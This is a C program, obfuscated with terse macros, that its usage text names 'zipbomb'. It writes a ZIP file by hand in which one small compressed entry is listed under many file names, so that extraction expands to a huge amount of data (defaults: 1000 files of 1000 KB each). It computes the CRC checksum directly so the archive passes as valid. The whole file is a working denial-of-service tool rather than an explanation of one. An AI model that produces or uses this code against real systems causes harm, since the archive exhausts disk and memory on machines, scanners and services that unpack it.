#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define S(i) (1LL << i)
#define T(i) argc > i ? strtol(argv[i], 0, 10) : 1000
#define U(x) x & 255, x >> 8 & 255
#define V Y(I), Y(C + 14), Y(H)
#define W "\x14%c%c%c\x08"X
#define X "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c"
#define Y(x) U(x), x >> 16 & 255, x >> 24 & 255
#define Z 0, 0, 0, 0
#define write(...) fprintf(file, __VA_ARGS__)
int f(const unsigned long *x, const unsigned long y) {
	int output = 0;
	for (char i = 0; i < 33; i++) output ^= *(x + i) * (y >> i & 1);
	return output;
}
int main(int argc, char *argv[]) {
	if (argc > 1 && !strcmp(argv[1], "-h")) return printf("Usage: ./zipbomb   [name of output zip]   [number of files]\t  [size in kilobytes of each file]\nDefaults:\t\toutput.zip\t\t1000\t\t\t\t1000\n");
	FILE *file = fopen(argc > 1 ? argv[1] : "output.zip", "w");
	const unsigned int A = S(32) - 1, B = T(2), C = T(3); 
	unsigned int i, F = C * 1032 + 1;
	const unsigned int H = F;
	unsigned long D[33], d[33], E[8], G[33], g[33];
	for (i = 0; i < 33; i++) D[i] = S(i);
	for (i = 0; i < 8; i++) {
		E[i] = 0;
		for (char j = 0; j < 8; j++) E[i] = E[i] >> 1 ^ 3988292384 * ((1 << i >> j ^ E[i]) & 1);
		G[i] = E[i];
	}
	for (i = 0; i < 24; i++) G[i + 8] = S(i);
	G[32] = A + 1;
	while (F) {
		for (i = 0; i < 33; i++) {
			d[i] = D[i];
			g[i] = G[i];
		}
		if (F & 1) for (i = 0; i < 33; i++) D[i] = f(d, G[i]);
		for (i = 0; i < 33; i++) G[i] = f(g, G[i]);
		F >>= 1;
	}
	const int I = ~f(D, 2 * A + 1) & A;
	int J = write("PK\3\4"W"\1%c%c%c0\xed\xc0\x81\x08%c%c%c\xc0\xb0\xfbS_d\x0b", Z, Z, V, Z, 0, 0);
	for (i = 0; i < C - 1; i++) J += write("%c", 0);
	J += write("`");
	const int K = J;
	for (i = 0; i < B; i++) {
		char num[100];
		sprintf(num, "%d", i);
		const char size = strlen(num);
		J += write("PK\1\2\x14%c"W"%c"X, Z, Z, 0, V, U(size), Z, Z, Z, Z) + write(num);
	}
	write("PK\5\6%c"X, Z, U(B), U(B), Y(J-K), Y(K), 0, 0);
	return fclose(file);
}